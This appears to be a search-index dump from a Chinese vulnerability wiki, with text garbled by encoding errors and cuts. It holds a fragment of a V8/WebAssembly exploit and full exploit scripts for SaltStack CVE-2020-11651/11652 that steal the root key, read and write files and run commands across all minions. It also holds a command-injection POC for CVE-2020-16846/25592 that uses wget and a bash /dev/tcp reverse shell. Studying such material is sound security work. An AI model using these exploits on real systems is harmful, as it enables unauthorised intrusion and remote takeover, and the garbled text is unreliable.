rajvardhan agarwal All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */ var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]) var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f = wasm_instance.exports.main; var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); let buf2 = new ArrayBuffer(0x150); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) > 32n); return f64_buf[0]; } const _arr = new Uint32Array([2**31]); function foo(a) { var x = 1; x = (_arr[0] ^ 0) + 1; x = Math.abs(x); x -= 2147483647; x = Math.max(x, 0); x -= 1; if(x==-1) x = 0; var arr = new Array(x); arr.shift(); var cor = [1.1, 1.2, 1.3]; return [arr, cor]; } for(var i=0;i ` PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Saltstack/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Saltstack/","title":"Saltstack","keywords":"","body":"Saltstack Saltstack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-11651/11652 SaltStack æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-16846/25592 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-07 14:01:34 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Saltstack/Saltstack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-11651 11652.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Saltstack/Saltstack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-11651 11652.html","title":"Saltstack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-11651/11652","keywords":"","body":"Saltstack è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-11651/11652 æ¼æ´æè¿° SaltStack æ˜¯åŸºäº Python å¼€å‘çš„ä¸€å¥—C/Sæ¶æ„é…ç½®ç®¡ç†å·¥å…·ã€‚å›½å¤–æŸå®‰å…¨å›¢é˜ŸæŠ«éœ²äº† SaltStack å­˜åœ¨è®¤è¯ç»•è¿‡æ¼æ´ï¼ˆCVE-2020-11651ï¼‰å’Œç›®å½•éå†æ¼æ´ï¼ˆCVE-2020-11652ï¼‰ã€‚ åœ¨ CVE-2020-11651 è®¤è¯ç»•è¿‡æ¼æ´ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œå¯ä»¥ç»•è¿‡ Salt Master çš„éªŒè¯é€»è¾‘ï¼Œè°ƒç”¨ç›¸å…³æœªæˆæƒå‡½æ•°åŠŸèƒ½ï¼Œä»è€Œå¯ä»¥é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ åœ¨ CVE-2020-11652 ç›®å½•éå†æ¼æ´ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œå¯ä»¥è¯»å–ã€å†™å…¥æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶ã€‚ æ¼æ´å½±å“ [!NOTE] SaltStack Version SaltStack Version ç¯å¢ƒæ­å»º [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-11652 docker-compose up -d æ¼æ´å¤ç° salt-masteræ™®éä½¿ç”¨è¿™ä¸¤è¡Œä»£ç è¿›è¡Œè®¤è¯ï¼Œå…¶ä¸­clear_loadæ˜¯å¯æ§è¾“å…¥ç‚¹ã€‚ auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load) auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key) _prep_auth_infoé¦–å…ˆä¼šè¯†åˆ«clear_loadè¾“å…¥çš„å­—æ®µå¹¶é€‰ç”¨å…¶ä¸­ä¹‹ä¸€ä½œä¸ºè®¤è¯æ–¹å¼ï¼Œç„¶åä¼ å‚åˆ°check_authenticationæ–¹æ³•æ£€éªŒè®¤è¯æ˜¯å¦æœ‰æ•ˆã€‚ åœ¨ç¬¬ä¸‰ç§è®¤è¯æ–¹å¼auth_type=='user'ä¸­ï¼Œä¼šç”±_prep_auth_infoè·å–åˆ°ç³»ç»Ÿoptçš„keyï¼Œä¼ é€’åˆ°check_authenticationä¸­å’ŒAPIå‚æ•°ä¸­æºå¸¦çš„keyè¿›è¡Œ==æ¯”å¯¹ã€‚ ç†è®ºä¸Š_prep_auth_infoæ˜¯ä¸å¯è¢«å¤–éƒ¨è°ƒç”¨çš„ï¼Œæ¼æ´æˆå› å³æ˜¯æ”»å‡»è€…é€šè¿‡åŒ¿åAPIç›´æ¥è°ƒç”¨_prep_auth_infoæ–¹æ³•ï¼Œåœ¨å›æ˜¾ä¸­æ‹¿åˆ°self.keyï¼Œå¹¶åœ¨åç»­çš„è¯·æ±‚ä¸­ä½¿ç”¨è·å–åˆ°çš„keyè¿‡éªŒè¯ï¼Œä»¥rootæƒé™æ‰§è¡Œé«˜å±æŒ‡ä»¤ã€‚ Mworker daemonè¿›ç¨‹å¤„ç†APIè¯·æ±‚ï¼š class MWorker(salt.utils.process.SignalHandlingProcess): \"\"\" The worker multiprocess instance to manage the backend operations for the salt master. \"\"\" å…¶ä¸­ _handle_clear & _handle_aes å‡½æ•°åˆ†åˆ«å¤„ç†æ˜æ–‡å’ŒåŠ å¯†æŒ‡ä»¤ï¼š åœ¨è¿™é‡Œï¼Œself._clear_funcs æ˜¯ class ClearFuncs çš„å®ä¾‹ï¼Œåœ¨è¿™é‡ŒAPIè®¿é—®è€…å¯ä»¥æ— è®¤è¯è°ƒç”¨ä»»æ„çš„ç±»å‡½æ•°ã€‚ class ClearFuncs(TransportMethods): \"\"\" Set up functions that are safe to execute when commands sent to the master without encryption and authentication \"\"\" ClearFuncs._prep_auth_info()å°†self.keyè¿”å›ç»™APIé€ æˆæ³„éœ²ã€‚æ”»å‡»è€…å¯å…ˆé€šè¿‡è¿™ä¸€æ–¹æ³•æ‹¿åˆ°keyï¼Œç„¶åé€šè¿‡è®¤è¯æ¥å£ä¸‹å‘shellæŒ‡ä»¤ã€‚ ä¹‹å‰å­˜åœ¨æ¼æ´çš„ä»£ç ä¸­ä»…è¿‡æ»¤æ‰__å¼€å¤´çš„privateæ–¹æ³•ï¼Œå¯¼è‡´_prep_auth_infoæ³„éœ²ï¼Œpatchä¸­å¯¹clearfuncså’Œaesfuncsä¸¤ä¸ªç±»æ·»åŠ äº†exposeç™½åå•è¿‡æ»¤ï¼š è¿™é‡Œä½¿ç”¨ POC æ¥å¤çº¿ ä¸‹è½½åœ°å€: https://github.com/jasperla/CVE-2020-11651-poc è¯»å–æ–‡ä»¶ /etc/passwd åå¼¹shellï¼ˆè¿™é‡Œä½¿ç”¨å¦ä¸€ä¸ªPOCï¼‰ ä¸‹è½½åœ°å€: https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py æ¼æ´åˆ©ç”¨POC ä¸‹è½½åœ°å€ # BASE https://github.com/bravery9/SaltStack-Exp # å¾®ä¿¡å…¬ä¼—å·ï¼šå°ä¸‹è¨€ä¹¦ # -*- coding:utf-8 -*- - from __future__ import absolute_import, print_function, unicode_literals import argparse import os import sys import datetime import salt import salt.version import salt.transport.client import salt.exceptions DEBUG = False def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') def check_salt_version(): print(\"[+] Salt ç‰ˆæœ¬: {}\".format(salt.version.__version__)) vi = salt.version.__version_info__ if (vi ä¸‹è½½åœ°å€ #!/usr/bin/env python # # Exploit for CVE-2020-11651 and CVE-2020-11652 # Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc) # This exploit is based on this checker script: # https://github.com/rossengeorgiev/salt-security-backports from __future__ import absolute_import, print_function, unicode_literals import argparse import datetime import os import os.path import sys import time import salt import salt.version import salt.transport.client import salt.exceptions def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') # --- check funcs ---- def check_connection(master_ip, master_port, channel): print(\"[+] Checking salt-master ({}:{}) status... \".format(master_ip, master_port), end='') sys.stdout.flush() # connection check try: channel.send({'cmd':'ping'}, timeout=2) except salt.exceptions.SaltReqTimeoutError: print(\"OFFLINE\") sys.exit(1) else: print(\"ONLINE\") def check_CVE_2020_11651(channel): print(\"[+] Checking if vulnerable to CVE-2020-11651... \", end='') sys.stdout.flush() try: rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3) except: print('ERROR') return None else: pass finally: if rets: print('YES') root_key = rets[2]['root'] return root_key print('NO') return None def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path): print(\"[+] Checking if vulnerable to CVE-2020-11652 (read_token)... \", end='') sys.stdout.flush() # try read file msg = { 'cmd': 'get_token', 'arg': [], 'token': top_secret_file_path, } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"YES\") except: print(\"ERROR\") raise else: if debug: print() print(rets) print(\"NO\") def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (read)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read', 'path': top_secret_file_path, 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) if rets['data']['return']: print(\"YES\") else: print(\"NO\") def check_CVE_2020_11652_write1(debug, channel, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (write1)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write', 'path': '../../../../../../../../tmp/salt_CVE_2020_11652', 'data': 'evil', 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) pp(rets) if rets['data']['return'].startswith('Wrote'): try: os.remove('/tmp/salt_CVE_2020_11652') except OSError: print(\"Maybe?\") else: print(\"YES\") else: print(\"NO\") def check_CVE_2020_11652_write2(debug, channel, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (write2)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'config.update_config', 'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652', 'yaml_contents': 'evil', 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) if rets['data']['return'].startswith('Wrote'): try: os.remove('/tmp/salt_CVE_2020_11652.conf') except OSError: print(\"Maybe?\") else: print(\"YES\") else: print(\"NO\") def pwn_read_file(channel, root_key, path, master_ip): print(\"[+] Attemping to read {} from {}\".format(path, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read', 'path': path, 'saltenv': 'base', } rets = channel.send(msg, timeout=3) print(rets['data']['return'][0][path]) def pwn_upload_file(channel, root_key, src, dest, master_ip): print(\"[+] Attemping to upload {} to {} on {}\".format(src, dest, master_ip)) sys.stdout.flush() try: fh = open(src, 'rb') payload = fh.read() fh.close() except Exception as e: print('[-] Failed to read {}: {}'.format(src, e)) return msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write', 'saltenv': 'base', 'data': payload, 'path': dest, } rets = channel.send(msg, timeout=3) print('[ ] {}'.format(rets['data']['return'])) def pwn_exec(channel, root_key, cmd, master_ip, jid): print(\"[+] Attemping to execute {} on {}\".format(cmd, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': 'runner', 'fun': 'salt.cmd', 'saltenv': 'base', 'user': 'sudo_user', 'kwarg': { 'fun': 'cmd.exec_code', 'lang': 'python', 'code': \"import subprocess;subprocess.call('{}',shell=True)\".format(cmd) }, 'jid': jid, } try: rets = channel.send(msg, timeout=3) except Exception as e: print('[-] Failed to submit job') return if rets.get('jid'): print('[+] Successfully scheduled job: {}'.format(rets['jid'])) def pwn_exec_all(channel, root_key, cmd, master_ip, jid): print(\"[+] Attemping to execute '{}' on all minions connected to {}\".format(cmd, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': '_send_pub', 'fun': 'cmd.run', 'user': 'root', 'arg': [ \"/bin/sh -c '{}'\".format(cmd) ], 'tgt': '*', 'tgt_type': 'glob', 'ret': '', 'jid': jid } try: rets = channel.send(msg, timeout=3) except Exception as e: print('[-] Failed to submit job') return finally: if rets == None: print('[+] Successfully submitted job to all minions.') else: print('[-] Failed to submit job') def main(): parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652') parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1') parser.add_argument('--port', '-p', dest='master_port', default='4506') parser.add_argument('--force', '-f', dest='force', default=False, action='store_false') parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true') parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true') parser.add_argument('--read', '-r', dest='read_file') parser.add_argument('--upload-src', dest='upload_src') parser.add_argument('--upload-dest', dest='upload_dest') parser.add_argument('--exec', dest='exec', help='Run a command on the master') parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions') args = parser.parse_args() print(\"[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.\") time.sleep(1) # Both src and destination are required for uploads if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None): print('[-] Must provide both --upload-src and --upload-dest') sys.exit(1) channel = init_minion(args.master_ip, args.master_port) check_connection(args.master_ip, args.master_port, channel) root_key = check_CVE_2020_11651(channel) if root_key: print('[*] root key obtained: {}'.format(root_key)) else: print('[-] Failed to find root key...aborting') sys.exit(127) if args.run_checks: # Assuming this check runs on the master itself, create a file with \"secret\" content # and abuse CVE-2020-11652 to read it. top_secret_file_path = '/tmp/salt_cve_teta' with salt.utils.fopen(top_secret_file_path, 'w') as fd: fd.write(\"top secret\") # Again, this assumes we're running this check on the master itself with salt.utils.fopen('/var/cache/salt/master/.root_key') as keyfd: root_key = keyfd.read() check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path) check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key) check_CVE_2020_11652_write1(debug, channel, root_key) check_CVE_2020_11652_write2(debug, channel, root_key) os.remove(top_secret_file_path) sys.exit(0) if args.read_file: pwn_read_file(channel, root_key, args.read_file, args.master_ip) if args.upload_src: if os.path.isabs(args.upload_dest): print('[-] Destination path must be relative; aborting') sys.exit(1) pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip) jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow()) if args.exec: pwn_exec(channel, root_key, args.exec, args.master_ip, jid) if args.exec_all: print(\"[!] Lester, is this what you want? Hit ^C to abort.\") time.sleep(2) pwn_exec_all(channel, root_key, args.exec_all, args.master_ip, jid) if __name__ == '__main__': main() å‚è€ƒæ–‡ç«  https://www.cdxy.me/?p=822 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Saltstack/SaltStack æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-16846 25592.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Saltstack/SaltStack æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-16846 25592.html","title":"SaltStack æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-16846/25592","keywords":"","body":"SaltStack æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2020-16846/25592 æ¼æ´æè¿° 2020å¹´11æœˆ4æ—¥ï¼ŒSaltStack å®˜æ–¹å‘å¸ƒäº†ä¸€åˆ™å®‰å…¨æ›´æ–°å…¬å‘Šï¼Œå…¶ä¸­CVE-2020-16846å’ŒCVE-2020-25592ç»„åˆä½¿ç”¨å¯åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹é€šè¿‡salt-apiæ¥å£æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚CVE-2020-25592å…è®¸ä»»æ„ç”¨æˆ·è°ƒç”¨SSHæ¨¡å—ï¼ŒCVE-2020-16846å…è®¸ç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚salt-apiè™½ä¸æ˜¯é»˜è®¤å¼€å¯é…ç½®ï¼Œä½†ç»å¤§å¤šæ•°SaltStackç”¨æˆ·ä¼šé€‰æ‹©å¼€å¯salt-apiï¼Œæ•…å­˜åœ¨è¾ƒé«˜é£é™©ã€‚ æ¼æ´å½±å“ [!NOTE] SaltStack Version 3002 SaltStack Version 3001.1, 3001.2 SaltStack Version 3000.3, 3000.4 SaltStack Version 2019.2.5, 2019.2.6 SaltStack Version 2018.3.5 SaltStack Version 2017.7.4, 2017.7.8 SaltStack Version 2016.11.3, 2016.11.6,2016.11.10 SaltStack Version 2016.3.4, 2016.3.6,2016.3.8 SaltStack Version 2015.8.10, 2015.8.13 ç¯å¢ƒæ­å»º [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-16846 docker-compose up -d æ¼æ´å¤ç° salt-api RESTæ¥å£é»˜è®¤ä½¿ç”¨cherrypyæ¡†æ¶ï¼Œä»runæ¥å£çš„å®ç°ä¸Šå¯ä»¥çœ‹å‡ºé€šè¿‡clientå‚æ•°åŠ¨æ€è°ƒç”¨NetapiClientç±»ä¸­çš„æ–¹æ³•ã€‚ æ–‡ä¸­æŒ‡å®šä»£ç ä½ç½®é‡‡ç”¨ä»¥ä¸‹çº¦å®š FileLocation:Classname.method() salt/netapi/init.py:NetapiClient.run() lowå‚æ•°ä¸ºå¤–éƒ¨ä¼ å…¥å‚æ•°ï¼Œsalt.utils.args.format_callæ–¹æ³•å°†å‚æ•°èµ‹å€¼ç»™kwargsã€‚ å½“clientå‚æ•°ä¸ºsshæ—¶ï¼ŒåŠ¨æ€è°ƒç”¨salt/netapi/init.py:NetapiClient.ssh(), è¯¥æ–¹æ³•æœªé‡‡ç”¨ä»»ä½•é‰´æƒã€‚ salt/netapi/init.py:NetapiClient.ssh() è·Ÿè¿›ï¼Œè·¯å¾„å¦‚ä¸‹ï¼š salt/netapi/init.py:NetapiClient.ssh()â‡’salt/client/ssh/client.py:SSHClient.cmd_sync()â‡’salt/client/ssh/client.py:SSHClient._prep_ssh() salt/client/ssh/client.py:SSHClient._prep_ssh() è¯¥æ–¹æ³•å°†kwargså¤–éƒ¨å¯æ§å‚æ•°æ›´æ–°å€¼optså˜é‡ï¼Œè¯¥å˜é‡å¯ä»¥ç†è§£ä¸ºSaltStackç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œä½¿ç”¨è¯¥å˜é‡åˆå§‹åŒ–salt.client.ssh.SSHã€‚ salt/client/ssh/init.py:SSH.init() privçš„å€¼ä»optså˜é‡ä¸­è·å–ï¼Œå¹¶è°ƒç”¨salt.client.ssh.shell.gen_key()æ–¹æ³•ã€‚ salt/client/ssh/shell.py:gen_key() POCè¯·æ±‚åŒ…ä¸º POST /run HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/x-yaml Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 109 token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|wget http://xxx.dnslog.cn åå¼¹shellçš„æ–¹æ³• å…ˆå†™ bashæ–‡ä»¶ï¼Œå†…å®¹ä¸ºåå¼¹shellè¯­å¥ï¼Œä½¿ç”¨wgetä¸‹è½½åˆ°ç›®æ ‡ä¸­ [!NOTE] !/bin/sh bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 ç›‘å¬ç«¯å£ï¼Œä½¿ç”¨ /bin/bash è¿è¡Œæ–‡ä»¶ åå¼¹shell æ¼æ´åˆ©ç”¨POC [!NOTE] POCç›®å½•ä¸­ peiqi.shæ–‡ä»¶ éœ€è¦æ›´æ”¹åå¼¹ip,port,å¹¶ä¸Šä¼ åˆ°æœåŠ¡å™¨è®©ç›®æ ‡è¿›è¡Œä¸‹è½½ DNSæœ‰å“åº”åˆ™ä»£è¡¨å¯èƒ½æœ‰æ¼æ´ï¼Œä¾¿å¯ä»¥è¿›è¡Œåå¼¹shell import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: SaltStack Version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxx.dnslog.cn \\033[0m') print('+ \\033[36mFile_addr >>> http://xxx.xxx.xxx/cmd.sh \\033[0m') print('+ \\033[36mFile_name >>> cmd.sh \\033[0m') print('+------------------------------------------') def POC_1(target_url, dnslog): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget http://{}\".format(dnslog) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡Œ wget http://{} \\033[0m\".format(dnslog)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] è¯·æŸ¥çœ‹ Dnslogå“åº” \\033[0m\") while True: Chois = input(\"\\033[35mæ˜¯å¦åå¼¹ Shell(Y/N) >>> \\033[0m\") if Chois == \"Y\" or Chois == \"y\": File_addr = input(\"\\033[35mFile_addr >>> \\033[0m\") File_name = input(\"\\033[35mFile_name >>> \\033[0m\") POC_2(target_url, File_addr, File_name) else: sys.exit(0) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, File_addr, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget {}\".format(File_addr) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡Œ wget {} \\033[0m\".format(File_addr)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸä¸‹è½½{} \\033[0m\".format(File_addr)) POC_3(target_url, File_name) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, File_name): vuln_url = target_url + \"/run\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"DNT\": \"1\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Accept\": \"application/x-yaml\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|/bin/bash {}\".format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡Œ /bin/bash \\033[0m\".format(File_name)) if \"return\" in response.text and response.status_code == 200: print(\"\\033[32m[o] å‘½ä»¤æ‰§è¡Œå®Œæ¯•ï¼Œè¯·æŸ¥çœ‹æ˜¯å¦åå¼¹Shell \\033[0m\".format(File_name)) sys.exit(0) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[32m[o] å‘½ä»¤æ‰§è¡ŒæˆåŠŸ \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, dnslog) å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/MinIO/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/MinIO/","title":"MinIO","keywords":"","body":"MinIO MinIO SSRFæ¼æ´ CVE-2021-21287 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-22 08:54:49 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/MinIO/MinIO SSRFæ¼æ´ CVE-2021-21287.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/MinIO/MinIO SSRFæ¼æ´ CVE-2021-21287.html","title":"MinIO SSRFæ¼æ´ CVE-2021-21287","keywords":"","body":"MinIO SSRFæ¼æ´ CVE-2021-21287 æ¼æ´æè¿° 